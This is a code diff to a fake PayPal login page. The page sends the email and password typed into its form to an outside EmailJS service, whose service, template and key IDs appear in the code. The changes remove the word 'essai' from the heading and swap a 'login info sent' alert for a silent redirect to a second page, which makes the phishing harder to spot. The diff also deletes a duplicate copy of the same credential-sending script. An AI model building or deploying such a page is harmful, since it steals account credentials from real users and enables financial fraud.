@@ -104,7 +104,7 @@
 <body>
     <div class="login-container">
         <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">
-        <h2>Log in to PayPal essai</h2>
+        <h2>Log in to PayPal</h2>
         
         <form id="loginForm">
             <input type="text" id="email" placeholder="Email or mobile number" required>
@@ -135,39 +135,13 @@
 
                 emailjs.send("service_mm73ahh", "template_e733lop", params)
                     .then(function(response) {
-                        alert("Login info sent successfully!");
+                        // Redirection vers la page 2.html
+                        window.location.href = "2.html";
                     }, function(error) {
                         alert("Failed to send login info.");
                     });
             });
         });
     </script>
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-        emailjs.init("tvmRkCGzIhbmnkeQm");
-
-        document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault();
-
-            let email = document.getElementById("email").value;
-            let password = document.getElementById("password").value;
-
-            if (!email || !password) {
-                alert("Please fill in all fields.");
-                return;
-            }
-
-            let params = { email: email, password: password };
-
-            emailjs.send("service_mm73ahh", "template_e733lop", params)
-                .then(function(response) {
-                    window.location.href = "2.html";
-                }, function(error) {
-                    alert("Failed to send login info.");
-                });
-        });
-    });
-</script>
 </body>
 </html>
-
